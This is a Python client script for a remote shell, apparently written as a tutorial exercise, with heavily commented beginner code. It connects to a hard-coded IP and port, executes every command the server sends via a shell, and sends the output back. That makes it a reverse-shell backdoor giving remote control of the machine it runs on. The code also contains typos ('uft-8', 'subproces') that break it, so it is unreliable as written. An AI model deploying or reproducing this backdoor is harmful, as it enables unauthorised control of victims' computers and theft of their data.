#fucntion ofthe client.py is that it tries to connect to server
#wait for instruction
#recievesinstruction and run them
#take results and send them back to server
import socket
import os
import subprocess#this imports are useful because it help to collect request from the server.py file
#it helps in executing the instructions sent from server.py

#create a socket
s = socket.socket()
host = "192.168.43.215"#input the ip address of the host server
port = 9999

s.connect((host,port))#a way to bind the port on the host server and the host ipaddress
#it uses s.connect function


#create a loop,so that the client caan listen to several commands before it closes
while True:
    data = s.recv(1024)#this code recieves the command from the server,in 1024 chunks
    #then an if statement to check for a valid input
    if data[:2].decode("utf-8") == "cd":#it decodes the encoded data from the server and decodes it then it checks if it is equal to cd
        os.chdir(data[3:].decode("utf-8"))
#the above code changes the directory after confirming that the forst two characters id "cd"
#then it changes directory to the remaining characters of the command
    if len(data) > 0:#this code checks for the lenght of data(command) because it has to be more than 0
        cmd = subprocess.Popen(data[:].decode("uft-8"),shell = True, stdout=subprocess.PIPE , stdin=subproces.PIPE , stderr=subprocess.PIPE)#this code opens up a process if the command isnt cmd and it is more than zero
    #the following aruments explained.
    #shell opens up a command prompt,stdout takess care of output gotten from the shell
    #stdin is the input and stderr is the error if we type a wrong commaand
        output_byte = cmd.stdout.read() + cmd.stderr.read()
        #if there is an output or an error , it comnbines both the stdout fucntion and the stderr function
        output_str = str(output_byte,"utf-8")#this code transfers the byte error or output to a string
        #the last tow lines of code allows the client to see what we are doing
        currentWD = os.getcwd() + ">"#send the current working directory and the output also
        s.send(str.encode(output_str + currentWD))#this code converts the output string to a byte then sends it to a server

        #code to send directory

        #CODE TO PRINT THE OUTPUT AND ALL COMMANDS TO THE USER PC
        print(output_str)